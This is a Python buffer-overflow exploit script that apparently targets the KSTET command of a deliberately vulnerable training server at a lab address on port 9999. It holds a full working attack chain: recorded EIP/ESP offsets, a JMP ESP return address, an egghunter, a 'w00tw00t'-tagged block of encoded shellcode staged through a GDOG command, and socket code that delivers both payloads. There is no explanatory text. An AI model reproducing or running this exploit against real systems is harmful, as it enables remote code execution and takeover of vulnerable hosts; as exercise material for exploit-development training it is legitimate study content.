import socket
import os
import sys

host = '192.168.102.148'
port = 9999

# EIP is at offset 70
# ESP is at offset 74
# JMP ESP at address 0x625011AF within the application dll

egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8' + '\x77\x30\x30\x74' + '\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7'

junk = '\x90' * 5

junk += egghunter

junk += '\x90' * (70 - 5 - len(egghunter))

junk += '\xaf\x11\x50\x62'
junk += '\xeb\xb8\x90\x90'
junk += '\x90' * (500 - len(junk))

sploit = 'KSTET ' + junk

buf =  ""
buf += "w00tw00t"
#buf += '\x52\x5c\x90\x90'
#buf += '\x90' * 16
buf += "\xd9\xe9\xba\xde\xf5\xdd\xa4\xd9\x74\x24\xf4\x5e\x29"
buf += "\xc9\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x88\xe6\x3f"
buf += "\x51\xc8\xe1\x42\x9a\x30\xf2\x22\x12\xd5\xc3\x62\x40"
buf += "\x9e\x74\x53\x02\xf2\x78\x18\x46\xe6\x0b\x6c\x4f\x09"
buf += "\xbb\xdb\xa9\x24\x3c\x77\x89\x27\xbe\x8a\xde\x87\xff"
buf += "\x44\x13\xc6\x38\xb8\xde\x9a\x91\xb6\x4d\x0a\x95\x83"
buf += "\x4d\xa1\xe5\x02\xd6\x56\xbd\x25\xf7\xc9\xb5\x7f\xd7"
buf += "\xe8\x1a\xf4\x5e\xf2\x7f\x31\x28\x89\xb4\xcd\xab\x5b"
buf += "\x85\x2e\x07\xa2\x29\xdd\x59\xe3\x8e\x3e\x2c\x1d\xed"
buf += "\xc3\x37\xda\x8f\x1f\xbd\xf8\x28\xeb\x65\x24\xc8\x38"
buf += "\xf3\xaf\xc6\xf5\x77\xf7\xca\x08\x5b\x8c\xf7\x81\x5a"
buf += "\x42\x7e\xd1\x78\x46\xda\x81\xe1\xdf\x86\x64\x1d\x3f"
buf += "\x69\xd8\xbb\x34\x84\x0d\xb6\x17\xc1\xe2\xfb\xa7\x11"
buf += "\x6d\x8b\xd4\x23\x32\x27\x72\x08\xbb\xe1\x85\x6f\x96"
buf += "\x56\x19\x8e\x19\xa7\x30\x55\x4d\xf7\x2a\x7c\xee\x9c"
buf += "\xaa\x81\x3b\x32\xfa\x2d\x94\xf3\xaa\x8d\x44\x9c\xa0"
buf += "\x01\xba\xbc\xcb\xcb\xd3\x57\x36\x9c\x1b\x0f\x5e\x41"
buf += "\xf4\x52\x9e\x78\xbf\xda\x78\x10\xaf\x8a\xd3\x8d\x56"
buf += "\x97\xaf\x2c\x96\x0d\xca\x6f\x1c\xa2\x2b\x21\xd5\xcf"
buf += "\x3f\xd6\x15\x9a\x1d\x71\x29\x30\x09\x1d\xb8\xdf\xc9"
buf += "\x68\xa1\x77\x9e\x3d\x17\x8e\x4a\xd0\x0e\x38\x68\x29"
buf += "\xd6\x03\x28\xf6\x2b\x8d\xb1\x7b\x17\xa9\xa1\x45\x98"
buf += "\xf5\x95\x19\xcf\xa3\x43\xdc\xb9\x05\x3d\xb6\x16\xcc"
buf += "\xa9\x4f\x55\xcf\xaf\x4f\xb0\xb9\x4f\xe1\x6d\xfc\x70"
buf += "\xce\xf9\x08\x09\x32\x9a\xf7\xc0\xf6\xba\x15\xc0\x02"
buf += "\x53\x80\x81\xae\x3e\x33\x7c\xec\x46\xb0\x74\x8d\xbc"
buf += "\xa8\xfd\x88\xf9\x6e\xee\xe0\x92\x1a\x10\x56\x92\x0e"
buf += '\x90' * 16


expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send('GDOG ' + buf)
expl.recv(1024)
expl.send(sploit)
expl.close()
